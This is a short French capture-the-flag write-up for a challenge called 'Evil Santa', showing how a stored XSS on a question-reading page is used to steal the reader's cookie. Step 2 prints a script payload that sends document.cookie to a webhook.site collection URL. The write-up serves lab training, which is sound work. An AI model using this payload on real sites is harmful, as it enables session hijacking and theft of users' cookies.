# Evil Santa

Auteur : [HappoSnake](https://github.com/pathibault/)

Briève description : 

Nos adminstrateurs ont créés une plateforme afin de répondre aux questions des moussaillons ! Le seul problème c'est qu'un de nos chercheurs partenaires sur la plateforme de BugBounty MoussaillonSEC nous a mentionné qu'il y a un XSS possible sur la page de lecture des questions.

Seriez-vous en mesure de demontrer l'impacte de ce XSS en volant le cookie du lecteur ?


# Sources
- https://finctf.ettic.net/challenges#Evil%20Santa-42
- https://webhook.site/

# Solution
## 1. Pour commencer nous avons besoin d'un serveur pour recevoir la redirection de l'utilisateur.

<img src=./webhook_site.png>

<br/>

## 2. Dans la question inscrire le script xxs :

```
<script>var i=new Image;i.src="	https://webhook.site/f57227d7-da28-4430-b3d9-f282a1d8b636/?"+document.cookie;</script>
```
<img src=./formulaire.png>

<br/>

## 3. Récupérer le cookie contenant le flag sur le site webhook.site

<img src=./flag.png>